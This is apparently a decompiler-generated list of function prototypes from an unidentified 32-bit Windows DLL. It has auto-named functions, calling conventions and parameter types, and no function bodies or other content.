// int __usercall sub_10029BC2@<eax>(__int32 a1@<eax>);
_DWORD *__stdcall sub_10029C4A(int a1, _DWORD *a2);
_DWORD *__stdcall sub_10029C7F(int a1, _DWORD *a2);
_DWORD *__stdcall sub_10029CB4(int a1, _DWORD *a2);
int sub_10029CE9();
int sub_10029D4C();
int sub_10029DD6();
int sub_10029E46();
// bool __usercall sub_10029EAA@<al>(__int32 a1@<eax>, int a2, int a3);
char __cdecl sub_10029F42(int a1, void *a2, void *a3);
struct _FILETIME __cdecl sub_1002A02D(int a1);
// void __usercall sub_1002A080(__int32 a1@<eax>, _DWORD *a2, _DWORD *a3, int a4, int a5, int a6, int a7, volatile LONG *lpAddend, _DWORD *a9);
// _DWORD *__usercall sub_1002A306@<eax>(__int32 a1@<eax>, _DWORD *a2, void *a3, void *a4);
// _DWORD *__usercall sub_1002A5E0@<eax>(__int32 a1@<eax>, void **a2@<ebx>, _DWORD *a3, void *a4, _DWORD *a5, _DWORD *a6, _DWORD *a7, wchar_t *a8);
int *__cdecl sub_1002A7CB(int *a1, int a2, unsigned int a3, _DWORD *a4, volatile LONG *a5, int a6, int a7, int a8, int a9, __int64 a10, int a11, volatile LONG *lpAddend, int a13, int a14);
_DWORD *__stdcall sub_1002AB9A(_DWORD *a1);
_DWORD *__stdcall sub_1002ABD3(_DWORD *a1);
void __thiscall sub_1002AC00(_DWORD *this);
_DWORD *__thiscall sub_1002AC24(_DWORD *Block, char a2);
void __thiscall sub_1002AC40(int *this);
int *__thiscall sub_1002AC76(int *Block, char a2);
void __stdcall sub_1002AC92(int a1);
void __thiscall sub_1002ACC3(int *this);
int *__thiscall sub_1002ACFA(int *Block, char a2);
void __cdecl sub_1002AD16(int *a1);
// int *__usercall sub_1002D064@<eax>(int a1@<ecx>, int *a2@<ebx>);
_DWORD *__thiscall sub_1002D137(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1002D165(int *this, _DWORD *a2);
int __stdcall sub_1002D19E(int a1, unsigned int a2, int a3, unsigned __int16 a4, int *a5, int *a6, int a7, volatile LONG *a8, int a9, volatile LONG *lpAddend);
int *__thiscall sub_1002D2DB(int *this, char a2);
int __thiscall sub_1002D31A(int this, int *a2);
char __thiscall sub_1002D55A(_DWORD *this);
// void __usercall sub_1002D574(_DWORD *a1@<ecx>, int a2@<edi>);
void __thiscall sub_1002D5B7(int *this);
char sub_1002D605();
int *__thiscall sub_1002D608(int *Block, char a2);
int __thiscall sub_1002D624(int *this, int a2, int a3);
void *__thiscall sub_1002D6F4(int *this, void *a2);
_DWORD *__thiscall sub_1002D8EF(void *this, _DWORD *a2);
_DWORD *__stdcall sub_1002D960(_DWORD *a1, int a2);
int __thiscall sub_1002D9AA(int this);
_DWORD *__thiscall sub_1002D9DF(_DWORD *this, char a2);
void __thiscall sub_1002DA13(int this);
int __thiscall sub_1002DA62(_DWORD *this, char *a2, unsigned int a3);
int __thiscall sub_1002DAC4(_DWORD *this, unsigned int a2);
int __thiscall sub_1002DB0C(_DWORD *this, int a2);
int __thiscall sub_1002DB28(_DWORD *this, int a2);
int __thiscall sub_1002DB44(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1002DB83(_DWORD *this, unsigned int a2, int *a3, int *a4);
void __thiscall sub_1002DBF6(_DWORD *this);
int *__thiscall sub_1002DCA1(int *this, int *a2);
void __thiscall sub_1002DCE3(_DWORD *this);
void __thiscall sub_1002DD35(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_1002DDC6(_DWORD *this, unsigned int a2);
int __thiscall sub_1002DE1D(_DWORD *this, int a2);
int __thiscall sub_1002DE3B(_DWORD *this, int a2);
char *__thiscall sub_1002DE59(_DWORD *this, char *a2);
int __thiscall sub_1002DE7F(int *this);
int __thiscall sub_1002DEA6(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1002DEF0(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1002DF62(void *this, unsigned int a2, int a3);
unsigned int __thiscall sub_1002DF98(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1002E03E(_DWORD *this);
_DWORD *__stdcall sub_1002E147(_DWORD *a1);
void __thiscall sub_1002E18F(_DWORD *this);
int __thiscall sub_1002E1D2(_DWORD *this, _BYTE *a2);
void __thiscall sub_1002E22F(void *this, int a2, int *a3);
_DWORD *__thiscall sub_1002E27B(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1002E2AC(_DWORD *this, _DWORD *a2);
void *__thiscall sub_1002E306(void *Block, char a2);
_DWORD *__thiscall sub_1002E322(_DWORD *Block, char a2);
void __thiscall sub_1002E33E(_DWORD *this);
_DWORD *__thiscall sub_1002E34A(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_1002E366@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_1002E3B2(_DWORD *a1, unsigned int a2);
_DWORD *__stdcall sub_1002E3FE(_DWORD *a1);
_DWORD *__stdcall sub_1002E489(_DWORD *a1, int a2, volatile LONG *a3, int a4, int a5, volatile LONG *lpAddend, int a7);
_DWORD *__thiscall sub_1002E4FB(_DWORD *Block, char a2);
void __thiscall sub_1002E517(_DWORD *this);
int __thiscall sub_1002E54C(_DWORD **this, int a2);
int __fastcall sub_1002E596(int *a1, _DWORD *a2);
_DWORD *__thiscall sub_1002E6B6(_DWORD *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, int a5, int a6);
_DWORD *__thiscall sub_1002E6F7(_DWORD *Block, char a2);
BOOL __thiscall sub_1002E713(_DWORD *this, int a2);
void *__thiscall sub_1002E738(_DWORD *this);
_DWORD *__stdcall sub_1002E75C(_DWORD *a1, int a2);
int __stdcall sub_1002E794(int a1, char a2, char a3, void *a4, int a5, int a6, int a7, volatile LONG *a8, int a9, volatile LONG *lpAddend, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, volatile LONG *a20);
_DWORD *__thiscall sub_1002E89B(_DWORD *Block, char a2);
void __thiscall sub_1002E8B7(_DWORD *this);
int __thiscall sub_1002E912(int this, int **a2);
char sub_1002EB80();
void __cdecl __noreturn sub_1002EB83(int a1, int a2);
_DWORD *__thiscall sub_1002EBA5(_DWORD *this, int a2);
int __thiscall sub_1002EBDD(_DWORD *this, int a2, _DWORD *a3, _DWORD *a4, char a5);
_DWORD *__thiscall sub_1002ECC4(_DWORD *Block, char a2);
void *__thiscall sub_1002ECE0(_DWORD *this);
// char __userpurge sub_1002ED22@<al>(int a1@<esi>, int a2);
bool __thiscall sub_1002ED6D(_DWORD *this, int a2);
// char __usercall sub_1002EDC4@<al>(int a1@<edi>, int a2);
int __stdcall sub_1002EE31(int a1, int ACP, int a3, _DWORD *a4, int *a5, char a6, int a7, volatile LONG *a8, int a9, volatile LONG *lpAddend);
_DWORD *__thiscall sub_1002EF56(_DWORD *Block, char a2);
void __thiscall sub_1002EF72(_DWORD *this);
int __thiscall sub_1002EFA6(unsigned __int8 *this, LONG **a2);
void __stdcall sub_1002F0E2(int *a1);
char sub_1002F120();
int __thiscall sub_1002F123(int *this);
int *__thiscall sub_1002F158(int *Block, char a2);
int __stdcall sub_1002F174(int a1, int a2, int a3, int a4, int a5, char a6, void *a7, void *a8, int a9, volatile LONG *a10, int a11, volatile LONG *lpAddend, int a13, volatile LONG *a14);
_DWORD *__thiscall sub_1002F232(_DWORD *Block, char a2);
void __thiscall sub_1002F24E(_DWORD *this);
// int __userpurge sub_1002F282@<eax>(int a1@<ecx>, int a2@<ebp>, void *a3);
void __stdcall sub_1002F5E0(int *a1);
char sub_1002F60E();
void *__thiscall sub_1002F611(_DWORD *this, int a2, void *a3, _DWORD **a4, int a5);
_DWORD *__stdcall sub_1002F9C2(_DWORD *a1, _DWORD *a2);
void *__cdecl sub_1002FA5D(void *a1, int a2, int a3, int a4, void *a5);
int __cdecl sub_1002FADA(int a1, int a2, int a3, int a4, void *a5);
char __cdecl sub_1002FB55(_DWORD *a1);
bool __cdecl sub_1002FC2C(SYSTEMTIME SystemTime, SYSTEMTIME a2);
// char __usercall sub_1002FC83@<al>(int a1@<esi>, int a2);
// PCNZWCH __usercall sub_1002FCEE@<eax>(wint_t *a1@<esi>, PCNZWCH lpString1, unsigned int a3, unsigned int cchCount1);
// _DWORD *__userpurge sub_1002FD81@<eax>(unsigned int a1@<esi>, _DWORD *a2);
void __fastcall sub_1002FDF0(_DWORD *a1, int a2);
char sub_1002FE92();
int __fastcall sub_1002FE95(unsigned int a1, int a2, int a3);
int *__thiscall sub_1002FF45(int *Block, char a2);
void __thiscall sub_1002FF61(int *this);
void *__thiscall sub_1002FFC7(int *this, void *a2);
int __thiscall sub_100300A6(int *this, _DWORD *a2, int a3);
int __stdcall sub_100302DC(int a1);
char sub_1003051A();
int __stdcall sub_1003051D(int a1, char a2, wchar_t *a3, int a4, volatile LONG *a5, int a6, volatile LONG *lpAddend);
int *__thiscall sub_10030654(int *Block, char a2);
void __thiscall sub_10030670(int *this);
int __thiscall sub_100306A4(char *this, int *Size);
// int __userpurge sub_1003078C@<eax>(int a1@<edi>, int a2);
char __thiscall sub_100308D5(_BYTE *this, int a2);
char __thiscall sub_1003090E(int this, int a2);
void __thiscall sub_10030929(_DWORD *this, int a2, volatile LONG *lpAddend);
// _DWORD *__usercall sub_1003098B@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
_DWORD *__stdcall sub_100309B0(_DWORD *a1, int a2);
_DWORD *__thiscall sub_100309EA(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10030A06(_DWORD *Block, char a2);
void __thiscall sub_10030A22(_DWORD *this);
void __stdcall sub_10030A49(int a1, int a2, int a3);
// BOOL __usercall sub_10030AAC@<eax>(int a1@<eax>);
int __thiscall sub_10030ACC(int *this);
// int __userpurge sub_10030BB2@<eax>(int a1@<ebx>, int *a2);
void *__thiscall sub_10030CA7(_DWORD *this, int a2);
int __thiscall sub_10030D3B(int this, int a2);
_DWORD *__thiscall sub_10030D6C(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10030DDD(void *this, _DWORD *a2, void *Block);
_DWORD *__stdcall sub_10030E5E(_DWORD *a1, int a2);
int __thiscall sub_10030EA8(int this);
void __thiscall sub_10030EDD(_DWORD *this);
_DWORD *__thiscall sub_10030F04(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_10030F20@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
void **__thiscall sub_10030F6C(void **this, void **a2);
void __thiscall sub_10030FAB(int this);
int __thiscall sub_10030FFA(_DWORD *this, char *a2, unsigned int a3);
int __thiscall sub_1003105C(_DWORD *this, unsigned int a2);
int __thiscall sub_100310A4(_DWORD *this, int a2);
int __thiscall sub_100310C0(_DWORD *this, int a2);
unsigned int __thiscall sub_100310DC(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_1003114F(_DWORD *this, int a2, int a3, int a4);
_DWORD *__stdcall sub_1003119E(_DWORD *a1);
void __thiscall sub_10031221(_DWORD *this);
int __thiscall sub_1003126C(_DWORD *this, _BYTE *a2);
void __thiscall sub_100312DD(void *this, int a2, int *a3);
_DWORD *__thiscall sub_10031329(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1003135A(_DWORD *this, _DWORD *a2);
void *__thiscall sub_1003138B(void *Block, char a2);
// int __userpurge sub_100313A7@<eax>(_DWORD *a1@<ebx>, _BYTE *a2);
char __thiscall sub_10031428(_DWORD *this, int a2);
int __stdcall sub_100314BB(int a1, int a2, int a3, char a4, int a5, void *a6, volatile LONG *lpAddend);
_DWORD *__thiscall sub_100315B8(_DWORD *Block, char a2);
void __thiscall sub_100315D4(_DWORD *this);
int __thiscall sub_1003163A(_DWORD *this, int a2, int a3);
int __thiscall sub_100317AD(void *this, _DWORD *a2, int a3, int a4);
char __thiscall sub_1003198C(void *this, _DWORD *a2, int a3, int a4);
// char __usercall sub_10031A0F@<al>(int a1@<ecx>, int a2@<edi>);
// void __usercall sub_10031D8B(int a1@<esi>);
void __fastcall sub_10031DF3(int a1, int a2, int a3);
// void __userpurge sub_10031EFC(int a1@<ebp>, void *a2);
// _DWORD *__userpurge sub_100322DB@<eax>(_DWORD *a1@<edi>, _DWORD *a2);
unsigned int __stdcall sub_1003232A(int a1, unsigned int ArgList);
void *__thiscall sub_10032417(int this, void *a2, int a3, int a4, volatile LONG *lpAddend);
void __fastcall sub_1003258C(int a1, int a2, int a3, int a4, volatile LONG *lpAddend);
// void __userpurge sub_1003267E(__int32 a1@<eax>, int a2);
// BOOL __usercall sub_10032933@<eax>(_DWORD *a1@<edi>, _DWORD *a2@<esi>);
bool __fastcall sub_10032967(_DWORD *a1, _DWORD *a2);
LONG *__cdecl sub_10032A76(LONG *a1, unsigned int a2);
// int __usercall sub_10032B59@<eax>(int a1@<edi>);
void __fastcall sub_10032C8B(int a1, int a2);
_DWORD *__thiscall sub_10032D8F(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10032E00(void *this, _DWORD *a2);
_DWORD *__stdcall sub_10032E71(_DWORD *a1);
void __thiscall sub_10032EA8(_DWORD *this);
_DWORD *__thiscall sub_10032EFF(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10032F5B(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10032FB7(_DWORD *Block, char a2);
int *__stdcall sub_10032FD3(int *Block);
_DWORD *__stdcall sub_10032FFF(_DWORD *a1);
_DWORD *__stdcall sub_10033020(_DWORD *a1, int a2);
BOOL __thiscall sub_1003306E(int this);
LONG *__thiscall sub_1003308B(LONG *this);
bool __thiscall sub_100330C5(int this);
_DWORD *__stdcall sub_100330DC(_DWORD *a1, int a2);
BOOL __thiscall sub_10033124(int this);
BOOL __thiscall sub_10033137(_DWORD *this);
int __thiscall sub_10033141(int this);
void __thiscall sub_10033174(_DWORD *this);
void __thiscall sub_10033178(_DWORD *this);
void __thiscall sub_1003317C(int *this);
int __thiscall sub_100331A3(_DWORD *this);
int __thiscall sub_100331DD(_DWORD *this);
int *__thiscall sub_10033217(int this);
_DWORD *__thiscall sub_10033296(_DWORD *this, _DWORD *a2);
int *__thiscall sub_1003331B(int *this, char a2);
int *__thiscall sub_1003334F(int *Block, char a2);
_DWORD *__stdcall sub_10033388(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8);
// LONG *__usercall sub_100333C9@<eax>(LONG *a1@<eax>, LONG *a2@<esi>);
void __thiscall sub_100333F8(int this);
int __thiscall sub_10033447(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_100334BF(_DWORD *this, unsigned int a2);
int __thiscall sub_10033513(_DWORD *this, int a2);
int __thiscall sub_10033531(_DWORD *this, int a2);
int __thiscall sub_1003354F(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10033593(_DWORD *this, unsigned int a2, int a3, int a4);
void __thiscall sub_10033605(_DWORD *this);
_DWORD *__stdcall sub_100336C2(_DWORD *a1);
void __thiscall sub_1003373D(_DWORD *this);
bool __thiscall sub_10033780(_DWORD *this, int a2);
int __thiscall sub_100337BD(_DWORD *this, int a2);
_DWORD *__thiscall sub_10033822(void *this, int a2, int *a3);
_DWORD *__thiscall sub_10033840(_DWORD *this, _DWORD *a2);
int *__thiscall sub_1003389A(int *this, int *a2);
void __thiscall sub_100338DC(_DWORD *this);
void __thiscall sub_1003392E(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_100339C8(_DWORD *this, unsigned int a2);
int __thiscall sub_10033A36(_DWORD *this, int a2);
int __thiscall sub_10033A55(_DWORD *this, int a2);
char *__thiscall sub_10033A74(_DWORD *this, char *a2);
int __thiscall sub_10033A9A(int *this);
BOOL __thiscall sub_10033AC1(void *this);
int __thiscall sub_10033ACC(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10033B24(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_10033BA0(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_10033C4A(_DWORD *this);
void __thiscall sub_10033D49(_DWORD *this);
bool __thiscall sub_10033D8C(_DWORD *this, _DWORD *a2);
char __thiscall sub_10033DCA(_DWORD *this, _DWORD *a2);
int __thiscall sub_10033E2C(_DWORD *this, _DWORD *a2);
int __thiscall sub_10033E96(_DWORD *this, _DWORD *a2);
_BYTE *__thiscall sub_10033F00(void *this, int a2, char *a3);
_DWORD *__thiscall sub_10033F16(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10033F70(_DWORD *this, _DWORD *a2);
void __thiscall sub_10033FA1(_DWORD *this);
int __thiscall sub_10033FC8(_DWORD *this);
BOOL __thiscall sub_10033FD0(_DWORD *this, int a2);
int __thiscall sub_10034002(_DWORD *this, int a2);
int __thiscall sub_10034033(_DWORD *this, int a2);
int __thiscall sub_10034064(_DWORD *this);
void __thiscall sub_1003406C(void **this);
void *__thiscall sub_100340B9(void *Block, char a2);
_DWORD *__thiscall sub_100340D5(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100340F1(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003410D(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10034129(_DWORD *Block, char a2);
// int __userpurge sub_10034145@<eax>(_DWORD *a1@<eax>, _DWORD *a2);
_DWORD *__stdcall sub_100341E9(_DWORD *a1);
_DWORD *__stdcall sub_10034274(int a1, _DWORD *a2);
_DWORD *__stdcall sub_100342A9(int a1, _DWORD *a2);
LONG *__stdcall sub_100342DE(LONG *a1);
int *__thiscall sub_10034343(int *Block, char a2);
void __thiscall sub_1003435F(int *this);
LONG *__stdcall sub_100343A3(LONG *a1, int a2);
void __thiscall sub_10034406(LONG *this, int a2);
// void __usercall sub_10034633(int a1@<edi>);
// _DWORD *__usercall sub_100346EC@<eax>(__int32 a1@<eax>, _DWORD *a2);
// _DWORD *__usercall sub_1003471B@<eax>(__int32 a1@<eax>, _DWORD *a2);
_DWORD *__cdecl sub_1003474A(_DWORD *a1);
// void __usercall sub_10034863(__int32 a1@<eax>, _DWORD *a2@<ecx>, int a3);
char __stdcall sub_10034A02(void *a1);
char __stdcall sub_10034B52(void *a1);
_DWORD *__thiscall sub_10034C6A(void *this, _DWORD *a2);
void __thiscall sub_10034D9E(_DWORD *this);
_DWORD *__thiscall sub_10034DF5(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10034E51(_DWORD *this, _DWORD *a2);
int *__thiscall sub_10034EAD(void *this, int *a2, unsigned int a3);
void __thiscall sub_10034F16(void *this, int a2);
_DWORD *__thiscall sub_10034F4E(_DWORD *Block, char a2);
int *__stdcall sub_10034F6A(int *Block);
void __stdcall sub_10034F96(int *a1);
int __thiscall sub_10034FE0(_DWORD *this);
int __thiscall sub_1003501A(_DWORD *this);
int *__thiscall sub_10035054(int this);
_DWORD *__thiscall sub_100350D3(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10035158(_DWORD *this, _DWORD *a2);
_DWORD *__stdcall sub_100351EA(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15);
_DWORD *__stdcall sub_1003522D(_DWORD *a1, int a2, int a3, _DWORD *a4, char a5, _DWORD *a6, wchar_t *lpAddend, int a8, int a9);
_DWORD *__stdcall sub_100352B2(_DWORD *a1, int a2, int a3, _DWORD *a4, char a5, int a6, int a7, _DWORD *a8, wchar_t *lpAddend, int a10, volatile LONG *a11);
int *__thiscall sub_1003535E(int *Block, char a2);
void __thiscall sub_1003537A(int *this);
void __thiscall sub_100353B1(int *this);
void __thiscall sub_1003544C(_DWORD *this, char a2, int a3, int a4);
void __noreturn sub_10035523();
void __thiscall sub_10035545(_DWORD *this, int a2, int a3);
_DWORD *__stdcall sub_10035573(_DWORD *a1, int a2, volatile LONG *a3, int a4, volatile LONG *lpAddend);
_DWORD *__thiscall sub_100355FB(_DWORD *Block, char a2);
void __thiscall sub_10035617(_DWORD *this);
int __stdcall sub_1003563B(int a1);
char sub_10035656();
int __stdcall sub_10035659(int a1, int *a2, int a3, int a4, _DWORD *a5, wchar_t *lpAddend);
void __thiscall sub_1003589C(_DWORD *this);
_DWORD *__thiscall sub_100358BA(_DWORD *Block, char a2);
void __thiscall sub_100358D6(int this);
_DWORD *__stdcall sub_1003592A(_DWORD *a1);
_DWORD *__thiscall sub_1003595C(int this, _DWORD *a2);
int __thiscall sub_100359B8(_DWORD *this, char a2, char a3, int a4);
char __fastcall sub_10035B40(int a1, int *a2);
// void *__userpurge sub_10035BA0@<eax>(void *a1@<ecx>, int *a2@<esi>, void *a3, int a4);
int *__thiscall sub_10035C02(_DWORD *this, int *a2);
int __stdcall sub_10035C6C(int a1, int a2, int a3, _DWORD *a4, char a5, int a6, volatile LONG *lpAddend);
void *__thiscall sub_10035D9C(void *Block, char a2);
// void __userpurge sub_10035DB8(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10035E78(int this);
int __thiscall sub_10035F08(int this, _DWORD *a2);
// int __userpurge sub_100363B4@<eax>(int a1@<ebx>, _DWORD *a2);
void __thiscall sub_100365A5(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_100365D6(_DWORD *this, _DWORD *a2);
_DWORD *__stdcall sub_10036615(_DWORD *a1, int a2, _DWORD *a3);
int *__thiscall sub_10036650(int *this, int *a2);
void __thiscall sub_100366A4(_DWORD *this);
void __thiscall sub_10036707(_DWORD *this, int a2, unsigned int a3);
int __thiscall sub_100367CF(_DWORD *this, unsigned int a2);
int __thiscall sub_10036851(_DWORD *this, int a2);
int __thiscall sub_10036870(_DWORD *this, int a2);
int __thiscall sub_1003688F(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_100368F2(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_1003696E(_DWORD *this, int a2, int a3, void *Block);
void __thiscall sub_10036A2F(_DWORD *this);
_DWORD *__thiscall sub_10036B58(_DWORD *Block, char a2);
// void __usercall sub_10036B74(_DWORD *a1@<edi>);
char __thiscall sub_10036BDB(_DWORD *this, int a2);
void *__thiscall sub_10036C70(int this);
void *__thiscall sub_10036CBF(void *Block, char a2);
void __thiscall sub_10036CDB(void *this);
void *__thiscall sub_10036D58(void *Block, char a2);
_DWORD *__fastcall sub_10036D74(void *a1, int a2, _DWORD *a3, _DWORD *a4, int a5);
int *__thiscall sub_10036E0F(int *Block, char a2);
void *__thiscall sub_10036E2B(int *this);
// int __userpurge sub_10036E6F@<eax>(__int32 a1@<eax>, int a2@<ebp>, void *a3, void *a4, void *a5, int a6, void *a7, int a8);
// int *__userpurge sub_10037670@<eax>(int *a1@<ebx>, _DWORD *a2, _DWORD *a3, int a4);
_DWORD *__fastcall sub_100377A6(int a1, int a2, _DWORD *a3, _DWORD *a4, int a5);
_DWORD *__thiscall sub_10037855(void *this, int a2, _DWORD *a3, int a4);
_DWORD *__thiscall sub_10037952(volatile LONG *this, int a2, _DWORD *a3, _DWORD *a4, int a5);
_DWORD *__thiscall sub_10037ACA(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10037B31(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10037BA2(void *this, _DWORD *a2);
int __thiscall sub_10037C13(int this, int a2);
_DWORD *__thiscall sub_10037C44(void *this, _DWORD *a2);
void __thiscall sub_10037CC9(int *this);
int __thiscall sub_10037CF0(void *this, int a2);
BOOL __thiscall sub_10037D1E(_DWORD *this);
LONG *__thiscall sub_10037D28(LONG *this);
void __thiscall sub_10037D5C(_DWORD *this);
_DWORD *__stdcall sub_10037D60(_DWORD *a1, int a2);
int __thiscall sub_10037DBA(int this);
void __thiscall sub_10037DF7(_DWORD *this);
void __thiscall sub_10037DFB(int *this);
int __thiscall sub_10037E30(int this);
int __thiscall sub_10037E74(int this);
int __thiscall sub_10037EB3(_DWORD *this);
int __thiscall sub_10037EE8(int this);
_DWORD *__stdcall sub_10037F2C(_DWORD *a1, int a2);
BOOL __thiscall sub_10037F89(_DWORD *this);
LONG *__thiscall sub_10037F93(LONG *this);
void __thiscall sub_10037FCD(_DWORD *this);
void __thiscall sub_10037FD1(int *this);
BOOL __thiscall sub_10038006(int this);
BOOL __thiscall sub_10038019(_DWORD *this);
int __thiscall sub_10038023(int this);
void __noreturn sub_10038051();
int *__thiscall sub_10038076(int *this, char a2);
int *__thiscall sub_100380AA(int *this, char a2);
int *__thiscall sub_100380DE(int *Block, char a2);
void __thiscall sub_100380FA(_DWORD *this);
int *__thiscall sub_10038135(int *this, char a2);
int *__thiscall sub_10038169(int *Block, char a2);
void __thiscall sub_10038185(_DWORD *this);
// _BYTE *__usercall sub_100381A7@<eax>(int a1@<edi>, _BYTE *a2@<esi>);
void __thiscall sub_100381BE(_DWORD *this);
int __thiscall sub_10038201(_DWORD *this, int a2);
_DWORD *__thiscall sub_10038260(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10038291(_DWORD *this, _DWORD *a2);
int *__thiscall sub_100382C2(int *this, int *a2);
void __thiscall sub_10038304(_DWORD *this);
void __thiscall sub_10038356(_DWORD *this, int a2, unsigned int a3);
int __thiscall sub_10038406(_DWORD *this, unsigned int a2);
int __thiscall sub_1003848D(_DWORD *this, int a2);
int __thiscall sub_100384AC(_DWORD *this, int a2);
char *__thiscall sub_100384CB(_DWORD *this, char *a2);
int __thiscall sub_100384F1(int *this);
int __thiscall sub_10038518(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10038582(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __stdcall sub_100385FE(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_1003860F(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_100386C0(_DWORD *this);
void __thiscall sub_100387C7(_DWORD *this);
int __thiscall sub_1003880A(_DWORD *this, int a2);
void __thiscall sub_10038883(void *this, int a2, int a3);
_DWORD *__thiscall sub_100388D8(_DWORD *this, _DWORD *a2);
void __thiscall sub_10038932(_DWORD *this);
int __thiscall sub_10038975(_DWORD *this, int a2);
int __thiscall sub_100389F4(_DWORD *this, int a2);
void __thiscall sub_10038A58(_DWORD *this);
bool __thiscall sub_10038A9B(_DWORD *this, _BYTE *a2);
char __thiscall sub_10038AD2(_DWORD *this, _BYTE *a2);
int __thiscall sub_10038B1F(_DWORD *this, _BYTE *a2);
_DWORD *__thiscall sub_10038B77(void *this, int a2, int *a3);
_DWORD *__thiscall sub_10038B8D(_DWORD *this, _DWORD *a2);
void __thiscall sub_10038BE3(_DWORD *this);
int *__thiscall sub_10038C18(int *this, int *a2);
void __thiscall sub_10038C5A(_DWORD *this);
void __thiscall sub_10038CAC(_DWORD *this, void *a2, unsigned int a3);
int __thiscall sub_10038D82(_DWORD *this, unsigned int a2);
int __thiscall sub_10038DF7(_DWORD *this, int a2);
int __thiscall sub_10038E16(_DWORD *this, int a2);
char *__thiscall sub_10038E35(_DWORD *this, char *a2);
int __thiscall sub_10038E5B(int *this);
int __thiscall sub_10038E82(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10038EDE(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_10038F5A(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1003900B(_DWORD *this);
// _DWORD *__userpurge sub_10039112@<eax>(_DWORD *a1@<esi>, int a2);
_DWORD *__thiscall sub_10039151(_DWORD *Block, char a2);
// char *__usercall sub_1003916D@<eax>(char *a1@<eax>);
_DWORD *__thiscall sub_1003918B(_DWORD *Block, char a2);
// int __userpurge sub_100391A7@<eax>(int a1@<edi>, int a2);
_DWORD *__thiscall sub_100391DB(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100391F7(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10039213(_DWORD *Block, char a2);
// char *__usercall sub_1003922F@<eax>(char *a1@<eax>);
_DWORD *__thiscall sub_1003924D(void *this, _DWORD *a2);
void __thiscall sub_100392FB(int *this);
// LONG *__usercall sub_10039380@<eax>(LONG *a1@<edi>, LONG *a2@<esi>);
void __thiscall sub_100393E6(_DWORD *this);
char *__thiscall sub_1003947F(char *Block, char a2);
char *__thiscall sub_100394C8(char *Block, char a2);
_DWORD *__stdcall sub_10039511(_DWORD *a1, int a2);
void __thiscall sub_10039550(_DWORD *this);
// void __usercall sub_10039581(_DWORD *a1@<edi>);
// void __thiscall Concurrency::details::UMSFreeThreadProxyFactory::~UMSFreeThreadProxyFactory(Concurrency::details::UMSFreeThreadProxyFactory *__hidden this); idb
Concurrency::details::UMSFreeThreadProxyFactory *__thiscall sub_1003961F(Concurrency::details::UMSFreeThreadProxyFactory *Block, char a2);
Concurrency::details::UMSFreeThreadProxyFactory *__stdcall sub_1003963B(Concurrency::details::UMSFreeThreadProxyFactory *a1, int a2, __int16 a3);
Concurrency::details::UMSFreeThreadProxyFactory *__thiscall sub_1003983D(Concurrency::details::UMSFreeThreadProxyFactory *Block, char a2);
void __thiscall sub_10039859(Concurrency::details::UMSFreeThreadProxyFactory *this);
// int __usercall sub_1003989C@<eax>(int a1@<ecx>, int a2@<ebp>);
// void __userpurge sub_10039B6F(int a1@<edi>, int a2, int a3);
_DWORD *__thiscall sub_10039E94(void *this, _DWORD *a2);
void __thiscall sub_10039F05(_DWORD *this);
_DWORD *__thiscall sub_10039F24(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10039F7A(void *this, _DWORD *a2, void *Block);
_DWORD *__thiscall sub_10039FFB(void *this, _DWORD *a2);
_DWORD *__stdcall sub_1003A06C(_DWORD *a1, int a2);
BOOL __thiscall sub_1003A0B8(int this);
int __thiscall sub_1003A0CB(int this);
_DWORD *__stdcall sub_1003A104(_DWORD *a1, int a2);
int __thiscall sub_1003A152(int this);
void **__thiscall sub_1003A188(void **this, void **a2);
